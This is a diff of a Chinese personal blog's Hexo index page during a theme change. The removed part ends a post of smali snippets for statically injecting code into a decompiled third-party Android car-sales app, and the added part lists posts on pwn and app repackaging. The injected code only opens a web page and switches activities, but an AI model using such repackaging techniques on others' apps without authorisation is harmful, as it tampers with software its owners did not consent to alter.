&#123;v0&#125;, Landroid/app/AlertDialog$Builder;-&gt;show()Landroid/app/AlertDialog;</span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.class Lcom/carking/cn/activity/Another$<span class="number">111</span>;</span><br><span class="line">.<span class="keyword">super</span> Ljava/lang/Object;</span><br><span class="line">.source <span class="string">"Another.java"</span></span><br><span class="line"></span><br><span class="line"># interfaces</span><br><span class="line">.implements Landroid/content/DialogInterface$OnClickListener;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># annotations</span><br><span class="line">.annotation system Ldalvik/annotation/EnclosingMethod;</span><br><span class="line">    value = Lcom/carking/cn/activity/Another;-&gt;onCreate(Landroid/os/Bundle;)V</span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line">.annotation system Ldalvik/annotation/InnerClass;</span><br><span class="line">    accessFlags = <span class="number">0x0</span></span><br><span class="line">    name = <span class="keyword">null</span></span><br><span class="line">.end annotation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># instance fields</span><br><span class="line">.field <span class="keyword">final</span> synthetic <span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method constructor &lt;init&gt;(Lcom/carking/cn/activity/Another;)V</span><br><span class="line">    .locals <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    iput-object p1, p0, Lcom/carking/cn/activity/Another$<span class="number">111</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line">    .line <span class="number">29</span></span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># virtual methods</span><br><span class="line">.<span class="function">method <span class="keyword">public</span> <span class="title">onClick</span><span class="params">(Landroid/content/DialogInterface;I)</span>V</span></span><br><span class="line"><span class="function">    .locals 3</span></span><br><span class="line"><span class="function">    .param p1, "dialog"    # Landroid/content/DialogInterface</span>;</span><br><span class="line">    .param p2, "which"    # I</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">34</span></span><br><span class="line">    <span class="keyword">const</span>-string v2, <span class="string">"https://www.google.com/"</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v2&#125;, Landroid/net/Uri;-&gt;parse(Ljava/lang/String;)Landroid/net/Uri;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    .line <span class="number">35</span></span><br><span class="line">    .local v1, <span class="string">"uri"</span>:Landroid/net/Uri;</span><br><span class="line">    <span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string v2, <span class="string">"android.intent.action.VIEW"</span></span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0, v2, v1&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;(Ljava/lang/String;Landroid/net/Uri;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">36</span></span><br><span class="line">    .local v0, <span class="string">"it"</span>:Landroid/content/Intent;</span><br><span class="line">    iget-object v2, p0, Lcom/carking/cn/activity/Another$<span class="number">111</span>;-&gt;<span class="keyword">this</span>$<span class="number">0</span>:Lcom/carking/cn/activity/Another;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2, v0&#125;, Lcom/carking/cn/activity/Another;-&gt;startActivity(Landroid/content/Intent;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br></pre></td></tr></table></figure>
-<p>Intent</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line">invoke-direct &#123;v0&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;()V</span><br><span class="line"><span class="keyword">const</span>-<span class="class"><span class="keyword">class</span> <span class="title">v1</span>, <span class="title">Lcom</span>/<span class="title">carking</span>/<span class="title">cn</span>/<span class="title">activity</span>/<span class="title">Another</span></span>;</span><br><span class="line">invoke-virtual &#123;v0, p0, v1&#125;, Landroid/content/Intent;-&gt;setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;</span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom/carking/cn/activity/MainActivity;-&gt;startActivity(Landroid/content/Intent;)V</span><br></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>-instance v0, Landroid/content/Intent;</span><br><span class="line"><span class="keyword">const</span>-<span class="class"><span class="keyword">class</span> <span class="title">v1</span>, <span class="title">Lcom</span>/<span class="title">ssj</span>/<span class="title">loopviewdemo</span>/<span class="title">LunbotuActivity</span></span>;</span><br><span class="line">invoke-direct &#123;v0, p0, v1&#125;, Landroid/content/Intent;-&gt;&lt;init&gt;(Landroid/content/Context;Ljava/lang/Class;)V</span><br><span class="line">.local v0, <span class="string">"intent"</span>:Landroid/content/Intent;</span><br><span class="line">invoke-virtual &#123;p0, v0&#125;, Lcom/ssj/loopviewdemo/MainActivity;-&gt;startActivity(Landroid/content/Intent;)V</span><br></pre></td></tr></table></figure>
-<p><code>adb logcat -v threadtime &gt; a.log</code><br>——— beginning of crash</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-  
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
-    </nav>
-  
-</div>
-      <footer id="footer">
-    <div class="outer">
-        <div id="footer-info">
-            <div class="footer-left">
-                &copy; 2020 ssj
-            </div>
-            <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
-            </div>
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">Search</label>
         </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+    <main>
         
-            <div class="visit">
+
+<div class="slider">
+    <ul class="slides">
+    
+       <li>
+           <a href="/">
+               <img class="slider-image" src="http://lorempixel.com/580/250/nature/1">
+               <div class="caption center-align">
+                 <h4>少年辛苦终身事，莫向光阴惰寸功</h3>
+                 <h5 class="light grey-text text-lighten-3"></h5>
+               </div>
+           </a>
+       </li>
+    
+   </ul>
+ </div>
+
+
+
+<div id="article-list" class="container main-container">
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
                 
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >到访数: 
-                            <span id="busuanzi_value_site_uv"></span>
-                        </span>
-                    </span>
+    
+        <h1 class="indigo-link-context"><a href="/2020/02/14/algorithm/">每天几道 算法</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2020-02-13T17:07:29.000Z"><a href="/2020/02/14/algorithm/">2020-02-14</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/算法/" class="chip pink lighten-1">算法</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2020/02/05/bytedanceinterview/">字跳面试实况转播</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2020-02-05T08:06:01.000Z"><a href="/2020/02/05/bytedanceinterview/">2020-02-05</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
+        
+            <a href="/tags/面试体验/" class="chip pink lighten-1">面试体验</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2020/01/21/daily-pwn/">每天一道 PWN</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2020-01-21T09:22:42.000Z"><a href="/2020/01/21/daily-pwn/">2020-01-21</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/pwn/" class="chip pink lighten-1">pwn</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2019/12/01/majiabao/">逆向改包 Tips</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2019-12-01T03:47:25.000Z"><a href="/2019/12/01/majiabao/">2019-12-01</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
+        
+            <a href="/tags/马甲包/" class="chip pink lighten-1">马甲包</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2019/11/23/people-still-here/">人没丢……</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2019-11-23T12:32:02.000Z"><a href="/2019/11/23/people-still-here/">2019-11-23</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/其它/" class="chip pink lighten-1">其它</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2019/07/25/zhulianzhai/">珠帘寨</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2019-07-25T13:25:21.000Z"><a href="/2019/07/25/zhulianzhai/">2019-07-25</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/京剧/" class="chip pink lighten-1">京剧</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2019/07/21/pwn1/">pwn 入门</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2019-07-20T17:21:05.000Z"><a href="/2019/07/21/pwn1/">2019-07-21</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/pwn/" class="chip pink lighten-1">pwn</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2019/07/08/ndk/">Android Studio NDK 开发环境搭建</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2019-07-08T09:17:51.000Z"><a href="/2019/07/08/ndk/">2019-07-08</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2019/06/27/vest-car-king/">给车王二手车套马甲</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2019-06-27T12:26:41.000Z"><a href="/2019/06/27/vest-car-king/">2019-06-27</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
+        
+            <a href="/tags/马甲包/" class="chip pink lighten-1">马甲包</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+        <article class="simple-article">
+    <div class="card">
+        <div class="card-content">
+            <div class="article-title">
+                
+    
+        <h1 class="indigo-link-context"><a href="/2019/06/27/android-inject-code/">Android静态注入常用代码</a></h1>
+    
+
+
+            </div>
+
+            <time class="pink-link-context" datetime="2019-06-27T10:20:08.000Z"><a href="/2019/06/27/android-inject-code/">2019-06-27</a></time>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/Android/" class="chip pink lighten-1">Android</a>
+        
+    </div>
+
+
+
+            
+        </div>
+
+        
+    </div>
+</article>
+
+    
+
+    <ul class="pagination center-align">
+    <li class="disabled">
+        <a href="/"><i class="fa fa-angle-left"></i></a>
+    </li>
+    
+    
+        <li class="active pink"><a href="/">1</a></li>
+    
+        <li class="waves-effect"><a href="/page/2">2</a></li>
+    
+        <li class="waves-effect"><a href="/page/3">3</a></li>
+    
+    
+    <li class="">
+        <a href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    </li>
+ </ul>
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="Return to top"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="Menu"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">Social</h5>
+                
+                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
                 
                 
-                    <span>, </span>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <div class="site-visitors-container white-text">
+        <span>
+            <i class="fa fa-user"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+        </span>
+        <span>&nbsp;|&nbsp;</span>
+        <span>
+            <i class="fa fa-eye"></i>
+            <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">Links</h5>
                 
+                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorism主题作者的技术博客</a>
                 
-                    <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit">本页阅读量: 
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    </span>
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Github地址（测试友情链接）</a>
                 
             </div>
-        
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
     </div>
 </footer>
 
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
     </div>
-    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-<script src="/js/main.js"></script>
-
-    <script>
-        $(document).ready(function() {
-            var backgroundnum = 13;
-            var backgroundimg = "url(/background/bg-" + backgroundnum +".jpg)";
-            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-        })
-    </script>
-
-
-
-
-
-<div class="scroll" id="scroll">
-    <a href="#"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
 </div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
 <script>
-    $(document).ready(function() {
-        if ($("#comments").length < 1) {
-            $("#scroll > a:nth-child(2)").hide();
-        };
-    })
-</script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
 
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
 
-  <script language="javascript">
-    $(function() {
-        $("a[title]").each(function() {
-            var a = $(this);
-            var title = a.attr('title');
-            if (title == undefined || title == "") return;
-            a.data('title', title).removeAttr('title').hover(
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
 
-            function() {
-                var offset = a.offset();
-                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
-                    top: offset.top - a.outerHeight() - 15,
-                    left: offset.left + a.outerWidth()/2 + 1
-                }).fadeIn(function() {
-                    var pop = $(this);
-                    setTimeout(function() {
-                        pop.remove();
-                    }, pop.text().length * 800);
-                });
-            }, function() {
-                $("#anchortitlecontainer").remove();
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
             });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
         });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
     });
 </script>
 
 
-  </div>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
 </body>
 </html>
